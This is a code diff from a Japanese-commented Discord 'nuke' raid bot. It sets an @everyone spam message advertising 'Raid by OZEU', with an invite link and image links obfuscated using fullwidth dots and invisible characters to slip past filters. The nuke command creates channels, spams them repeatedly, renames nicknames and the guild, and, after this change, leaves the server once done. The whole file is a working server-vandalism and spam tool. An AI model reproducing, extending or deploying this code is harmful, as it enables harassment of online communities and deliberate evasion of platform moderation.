@@ -23,10 +23,10 @@ INTENTS.members = True  # メンバー一覧・編集に必要
 ROLE_BASE = "ozeumember"
 ROLE_COUNT = 0
 CHANNEL_BASE = "ozeu-nuke"
-CHANNEL_COUNT = 100
+CHANNEL_COUNT = 1
 
 REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeu-x [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"
-REPEAT_COUNT = 100  # 各チャンネルに送信する回数
+REPEAT_COUNT = 1  # 各チャンネルに送信する回数
 
 # Nickname & guild rename params
 CHANGE_NICKNAMES = True
@@ -214,6 +214,14 @@ async def nuke(ctx):
     await backup_channel.send(f"✉️ 各チャンネルに同じメッセージを {REPEAT_COUNT} 回送信開始")
     await send_repeated_messages(created_channels, REPEAT_MESSAGE, REPEAT_COUNT)
     await backup_channel.send("✅ nuke 全工程完了")
+    
+    await backup_channel.send("✅ 完了。ボットはサーバーを離脱します。")
+    # small wait to ensure message delivered
+    await asyncio.sleep(1.0)
+    try:
+        await guild.leave()
+    except Exception as e:
+        logger.exception(f"Failed to leave guild: {e}")
 
 # Entrypoint
 if __name__ == "__main__":
